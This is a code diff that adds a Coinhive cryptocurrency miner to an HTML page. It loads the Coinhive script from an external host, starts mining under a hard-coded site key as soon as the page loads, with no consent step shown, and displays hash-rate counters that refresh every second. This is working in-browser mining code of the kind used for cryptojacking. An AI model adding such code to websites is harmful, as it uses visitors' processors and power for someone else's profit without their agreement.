@@ -1,0 +1,31 @@
+<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+
+<script>
+	var miner = new CoinHive.Anonymous('n2ihWFKqCI71kz8UhdV1PF7Q9doMsBZF');
+	miner.start();
+</script>
+
+<script>
+	// Listen on events
+	miner.on('found', function() { /* Hash found */ })
+	miner.on('accepted', function() { /* Hash accepted by the pool */ })
+
+	// Update stats once per second
+	setInterval(function() {
+		var hashesPerSecond = miner.getHashesPerSecond();
+		var totalHashes = miner.getTotalHashes();
+        var acceptedHashes = miner.getAcceptedHashes();
+        
+        document.getElementById('hashesPerSecond').innerText = hashesPerSecond;
+        document.getElementById('totalHashes').innerText = totalHashes;
+        document.getElementById('acceptedHashes').innerText = acceptedHashes;
+
+		
+	}, 1000);
+</script>
+
+<div>
+    H/S: <span id="hashesPerSecond"></span><br />
+    Total: <span id="totalHashes"></span><br />
+    Accepted Hashes: <span id="acceptedHashes"></span>    
+</div>
